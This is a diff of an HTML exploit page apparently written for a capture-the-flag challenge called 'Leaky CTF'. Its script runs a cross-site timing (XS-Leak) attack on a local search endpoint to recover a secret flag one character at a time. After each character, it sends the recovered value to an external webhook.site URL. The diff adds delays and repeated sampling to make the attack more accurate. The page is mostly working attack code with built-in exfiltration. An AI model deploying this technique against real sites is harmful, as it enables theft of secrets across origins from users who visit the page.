@@ -2,53 +2,53 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Leaky CTF Exploit</title>
+    <title>Leaky CTF Exploit - Upgraded</title>
 </head>
 <body>
-    <h1>Exploit is running... Check your webhook!</h1>
+    <h1>Exploit is running (Upgraded Version)... Check your webhook!</h1>
     <script>
-        // 你專屬嘅 Webhook URL
         const WEBHOOK_URL = "https://webhook.site/2579616d-2ffd-46a3-9668-b3e4ea0ccdac/?log=";
-        
-        // Bot 訪問時，後端應用程式係行喺 localhost:5000
         const TARGET = "http://localhost:5000/search?flag=";
         const CHARSET = "0123456789abcdef";
         let known = "leakyctf{";
 
+        // 升級 1：加入 Sleep 函數，用嚟製造 Delay
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+
         async function measureTime(url) {
             const start = performance.now();
             try {
-                // 用 no-cors 發送跨站請求 (XS-Leak 核心)
                 await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-            } catch (e) {
-                // 忽略 CORS 錯誤，因為我哋只在乎時間
-            }
+            } catch (e) {}
             return performance.now() - start;
         }
 
         async function exploit() {
-            // 暖機 (Warm-up)
+            // 暖機
             await measureTime(TARGET + "dummy_warmup");
+            await sleep(100);
 
-            // 破解 8 個 hex 字元
             for (let i = 0; i < 8; i++) { 
                 let timings = {};
 
-                // 測試每一個可能嘅 hex 字元
                 for (let char of CHARSET) {
                     let url = TARGET + known + char;
-                    
-                    // 每個字元測試 3 次並取最短時間，減少網絡波動影響
-                    let t1 = await measureTime(url);
-                    let t2 = await measureTime(url);
-                    let t3 = await measureTime(url);
-                    timings[char] = Math.min(t1, t2, t3);
+                    let minTime = Infinity;
+
+                    // 升級 2：測試 5 次，並加入冷卻時間
+                    for (let j = 0; j < 5; j++) {
+                        let t = await measureTime(url);
+                        if (t < minTime) minTime = t;
+                        
+                        // 每次 request 後等 10ms，避免伺服器太 chok 影響準確度
+                        await sleep(10); 
+                    }
+                    timings[char] = minTime;
                 }
 
                 let fastestChar = '';
                 let minTime = Infinity;
 
-                // 搵出耗時最短 (觸發咗 Short-circuit) 嘅字元
                 for (let char of CHARSET) {
                     if (timings[char] < minTime) {
                         minTime = timings[char];
@@ -57,16 +57,12 @@
                 }
 
                 known += fastestChar;
-                
-                // 每破解一個字元，就 send 去 Webhook 畀你睇進度
                 fetch(WEBHOOK_URL + known);
             }
             
-            // 破解完成，發送最終結果
             fetch(WEBHOOK_URL + "DONE_" + known + "}");
         }
 
-        // 啟動 Exploit
         exploit();
     </script>
 </body>
